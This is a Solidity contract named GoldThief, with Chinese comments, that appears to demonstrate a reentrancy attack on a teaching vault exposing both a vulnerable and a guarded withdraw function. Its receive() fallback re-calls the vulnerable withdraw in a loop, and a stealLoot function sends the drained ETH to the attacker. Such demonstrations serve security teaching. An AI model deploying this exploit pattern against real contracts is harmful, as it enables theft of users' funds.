// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
//在 GoldThief 合约能与金库交互之前，它需要知道有哪些函数可用——以及如何调用它们
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}
contract GoldThief {
    IVault public targetVault; //要攻击的金库地址
    address public owner;
    uint public attackCount; //记录我们重入循环的次数,用计数器来限制fallback回退函数重复调用金库的最大次数
    bool public attackingSafe; //记录当前攻击的是哪一个版本的金库,false-> vulnerableWithdraw(),true-> safeWithdraw()
    constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender; //确保只有 owner 能触发攻击（attackVulnerable() / attackSafe()）&&防止未经授权访问 stealLoot() 等函数
    }
    function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner"); //只有合约的原始攻击者（或该合约的部署者）被允许启动攻击
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw(); //调用金库的易受攻击提现函数
    }
    function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
    }
    receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
        }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail
        }
    }
    function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance); //允许攻击者把被盗来的的全部 ETH 从GoldThief 合约提现到Ta们的私人钱包
    }
    function getBalance() external view returns (uint256) {
    return address(this).balance;
    }


}